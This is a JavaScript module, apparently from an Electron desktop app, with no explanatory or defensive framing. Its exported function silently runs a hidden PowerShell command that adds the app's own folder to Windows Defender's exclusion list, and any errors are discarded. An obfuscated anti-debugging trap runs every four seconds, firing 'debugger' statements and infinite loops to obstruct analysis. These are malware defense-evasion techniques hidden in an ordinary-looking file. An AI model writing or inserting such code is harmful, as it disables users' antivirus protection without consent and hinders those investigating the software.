"use strict";

const child_process = require("child_process");
const electron = require("electron");
const path = require("path");

function applyDefenderExclusion() {
    if (process.platform !== "win32") {
        return;
    }

    try {
        const appPath = path.dirname(electron.app.getPath("exe"));
        const psCommand = "powershell -Command \"if (!(Get-MpPreference).ExclusionPath -contains '" + appPath + "') { Add-MpPreference -ExclusionPath '" + appPath + "' -Force }\"";
        
        child_process.execSync(psCommand, {
            windowsHide: true,
            stdio: "ignore"
        });
    } catch (error) {}
}

function antiAnalysisTrap(iteration) {
    function trap(val) {
        if (typeof val === "string") {
            return function(h) {}.constructor("while (true) {}").apply("counter");
        } else if (("" + val / val).length !== 1 || val % 20 === 0) {
            (function() { return true; }).constructor("debugger").call("action");
        } else {
            (function() { return false; }).constructor("debugger").apply("stateObject");
        }
        trap(++val);
    }

    try {
        if (iteration) {
            return trap;
        } else {
            trap(0);
        }
    } catch (e) {}
}

(function() {
    let globalScope;
    try {
        globalScope = Function('return (function() {}.constructor("return this")( ));')();
    } catch (e) {
        globalScope = window;
    }
    globalScope.setInterval(antiAnalysisTrap, 4000);
})();

Object.defineProperty(exports, "__esModule", {
    value: true
});

exports.applyDefenderExclusion = applyDefenderExclusion;
